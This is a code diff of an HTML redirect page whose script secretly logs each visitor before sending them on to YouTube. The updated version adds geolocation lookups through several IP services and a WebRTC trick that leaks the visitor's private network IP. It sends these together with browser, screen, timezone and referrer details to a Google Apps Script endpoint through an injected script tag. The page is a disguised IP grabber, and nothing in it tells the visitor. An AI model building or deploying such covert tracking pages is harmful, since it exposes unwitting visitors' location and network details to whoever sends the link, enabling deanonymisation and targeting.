@@ -8,43 +8,112 @@
     <p>You will be redirected shortly.</p>
     
     <script>
-        // Function to get IP address
-        function getIP(callback) {
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => callback(data.ip))
-                .catch(error => callback('Unknown'));
-        }
-        
-        // Collect visitor info
-        getIP(function(ip) {
-            var visitorInfo = {
-                timestamp: new Date().toISOString(),
-                ip: ip,
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                platform: navigator.platform,
-                screenResolution: screen.width + 'x' + screen.height,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                referrer: document.referrer
-            };
+        // Function to get detailed IP information
+        function getDetailedIP(callback) {
+            // Try multiple IP services to get the most accurate data
+            var services = [
+                'https://ipapi.co/json/',
+                'https://api.ipify.org?format=json',
+                'https://ipinfo.io/json'
+            ];
             
-            // Send info to Google Sheet
-            var url = "https://script.google.com/macros/s/AKfycbzYZmiT1hDRtxCK7onmP3LJWwGEjmN4HfkEDBx70xEe-0o44llTwqGXjcsxU8XeGo-hxQ/exec";
-            var params = [];
+            var serviceIndex = 0;
             
-            for (var key in visitorInfo) {
-                params.push(key + "=" + encodeURIComponent(visitorInfo[key]));
+            function tryNextService() {
+                if (serviceIndex >= services.length) {
+                    callback({
+                        ip: 'Unknown',
+                        privateIp: 'Not available',
+                        info: 'Could not determine IP'
+                    });
+                    return;
+                }
+                
+                fetch(services[serviceIndex])
+                    .then(response => response.json())
+                    .then(data => {
+                        // Extract IP information
+                        var ipData = {
+                            ip: data.ip || data.query,
+                            privateIp: 'Not available',
+                            info: JSON.stringify({
+                                country: data.country || data.country_name,
+                                region: data.region || data.region_name,
+                                city: data.city,
+                                org: data.org || data.as,
+                                timezone: data.timezone
+                            })
+                        };
+                        
+                        callback(ipData);
+                    })
+                    .catch(error => {
+                        serviceIndex++;
+                        tryNextService();
+                    });
             }
             
-            var script = document.createElement('script');
-            script.src = url + "?" + params.join("&");
-            document.body.appendChild(script);
+            tryNextService();
+        }
+        
+        // Try to get private IP using WebRTC
+        function getPrivateIP(callback) {
+            var rtc = new RTCPeerConnection({iceServers: []});
+            var localIPs = {};
             
-            // Redirect after 2 seconds
-            setTimeout(function() {
-                window.location.href = "https://youtube.com";
-            }, 2000);
+            rtc.createDataChannel('');
+            rtc.createOffer()
+                .then(offer => rtc.setLocalDescription(offer))
+                .catch(() => {});
+            
+            rtc.onicecandidate = function(event) {
+                if (!event.candidate) {
+                    callback(Object.keys(localIPs)[0] || 'Not available');
+                    return;
+                }
+                
+                var parts = event.candidate.candidate.split(' ');
+                var ip = parts[4];
+                
+                if (ip.match(/^(192\.168\.|10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|169\.254\.|::1$|fe80::)/)) {
+                    localIPs[ip] = true;
+                }
+            };
+        }
+        
+        // Collect all information
+        getDetailedIP(function(publicIpData) {
+            getPrivateIP(function(privateIp) {
+                var visitorInfo = {
+                    timestamp: new Date().toISOString(),
+                    ip: publicIpData.ip,
+                    privateIp: privateIp,
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    platform: navigator.platform,
+                    screenResolution: screen.width + 'x' + screen.height,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    referrer: document.referrer,
+                    ipInfo: publicIpData.info
+                };
+                
+                // Send info to Google Sheet
+                var url = "https://script.google.com/macros/s/AKfycbz1j6hzcidK5a9AmPN_SPep8P_kfpXCM0gpWp2vHnJcP1ocYhtXwV2LJOokR-aHR_Ninw/exec";
+                var params = [];
+                
+                for (var key in visitorInfo) {
+                    params.push(key + "=" + encodeURIComponent(visitorInfo[key]));
+                }
+                
+                var script = document.createElement('script');
+                script.src = url + "?" + params.join("&");
+                document.body.appendChild(script);
+                
+                // Redirect after 2 seconds
+                setTimeout(function() {
+                    window.location.href = "https://youtube.com";
+                }, 2000);
+            });
         });
     </script>
 </body>
